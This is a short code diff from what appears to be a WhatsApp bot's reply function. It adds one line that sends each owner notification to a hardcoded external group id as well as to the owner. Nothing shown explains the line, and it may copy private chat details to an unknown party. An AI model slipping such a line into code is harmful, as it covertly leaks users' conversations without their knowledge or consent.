@@ -518,6 +518,7 @@ async function sendReplies(msg, requirement) {
       ].join("\n");
 
       jobs.push(client.sendMessage(selfId, notification));
+      jobs.push(client.sendMessage("120363415081288381@g.us", notification));
     }
   }
 
